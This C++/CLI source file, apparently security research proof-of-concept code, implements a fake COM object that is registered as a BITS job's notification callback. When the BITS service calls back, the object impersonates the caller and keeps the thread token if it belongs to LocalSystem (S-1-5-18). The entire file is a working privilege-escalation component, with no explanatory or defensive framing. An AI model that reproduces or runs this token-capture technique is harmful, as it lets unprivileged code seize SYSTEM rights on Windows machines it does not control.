//  Copyright 2015 Google Inc. All Rights Reserved.
//
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//  http ://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

#include "stdafx.h"
#include <bits.h>
#include <bits4_0.h>
#include <stdio.h>
#include <tchar.h>
#include <lm.h>
#include <iostream>
#include <exception>
#include <string>
#include <comdef.h>
#include <memory>
#include <new>
#include <sddl.h>
#include "typed_buffer.h"
#include "ScopedHandle.h"

// {1941C949-0BDE-474F-A484-9F74A8176A7C}, ensure it's an interface with a registered proxy
IID IID_FakeInterface = { 0x6EF2A660, 0x47C0, 0x4666, { 0xB1, 0x3D, 0xCB, 0xB7, 0x17, 0xF2, 0xFA, 0x2C, } };

class CoScopedImpersonation
{
	bool _impersonating;

public:
	CoScopedImpersonation()
	{
		HRESULT hr = CoImpersonateClient();

		if (FAILED(hr))
		{
			_impersonating = false;			
		}
		else
		{
			_impersonating = true;
		}
	}

	bool IsImpersonating() const
	{
		return _impersonating;
	}

	~CoScopedImpersonation()
	{
		if (_impersonating)
		{
			RevertToSelf();
		}
	}
};

class FakeObject : public IUnknown
{
	LONG m_lRefCount;
	HANDLE* m_ptoken;

	void TryImpersonate()
	{
		if (*m_ptoken == nullptr)
		{
			CoScopedImpersonation imp;
		
			if(imp.IsImpersonating())
			{
				ScopedHandle hToken;

				if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, hToken.GetBuffer()))
				{					
					typed_buffer_ptr<TOKEN_USER> user(0x1000);					
					DWORD ret_len = 0;

					if (GetTokenInformation(hToken, TokenUser, user, static_cast<DWORD>(user.size()), &ret_len))
					{
						LPWSTR sid_name;

						ConvertSidToStringSid(user->User.Sid, &sid_name);

						if ((wcscmp(sid_name, L"S-1-5-18") == 0) && (*m_ptoken == nullptr))
						{
							*m_ptoken = hToken.Detach();							
						}						
					
						LocalFree(sid_name);
					}					
				}				
			}
		}
	}

public:
	//Constructor, Destructor
	FakeObject(HANDLE* ptoken) {
		m_lRefCount = 1;
		m_ptoken = ptoken;
		*m_ptoken = nullptr;
	}

	~FakeObject() {};

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		TryImpersonate();

		if (riid == __uuidof(IUnknown))
		{
			*ppvObj = this;
		}
		else if (riid == IID_FakeInterface)
		{			
			*ppvObj = this;
		}
		else
		{
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		TryImpersonate();
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		TryImpersonate();
		// not thread safe
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}
};

_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));

void DoCaptureToken(HANDLE* ptoken)
{
	// If CoInitializeEx fails, the exception is unhandled and the program terminates	
	
	IBackgroundCopyJobPtr pJob;
	try
	{
		HRESULT hr;
		//The impersonation level must be at least RPC_C_IMP_LEVEL_IMPERSONATE.
		(void)CoInitializeSecurity(NULL,
			-1,
			NULL,
			NULL,
			RPC_C_AUTHN_LEVEL_CONNECT,
			RPC_C_IMP_LEVEL_IMPERSONATE,
			NULL,
			EOAC_DYNAMIC_CLOAKING,
			0);
		
		// Connect to BITS.
		IBackgroundCopyManagerPtr pQueueMgr;

		IMonikerPtr pNotify;
		
		(void)CreatePointerMoniker(new FakeObject(ptoken), &pNotify);

		hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL,
			CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pQueueMgr));

		if (FAILED(hr))
		{
			throw gcnew System::Runtime::InteropServices::COMException("Error creating BITS", hr);			
		}

		GUID guidJob;
		hr = pQueueMgr->CreateJob(L"BitsAuthSample",
			BG_JOB_TYPE_DOWNLOAD,
			&guidJob,
			&pJob);

		if (FAILED(hr))
		{
			// Failed to connect.
			throw gcnew System::Runtime::InteropServices::COMException("Error creating job", hr);
		}

		pJob->SetNotifyInterface(pNotify);
	}	
	catch (...)
	{		
		throw;
	}
	finally
	{
		if (pJob)
		{
			pJob->Cancel();
		}
	}
}

class CoInitializer
{
public:
	CoInitializer()
	{
		(void)CoInitialize(NULL);
	}

	~CoInitializer()
	{
		CoUninitialize();
	}
};

ScopedHandle CaptureImpersonationToken()
{	
	ScopedHandle token;

	DoCaptureToken(token.GetBuffer());
	
	return token;
}
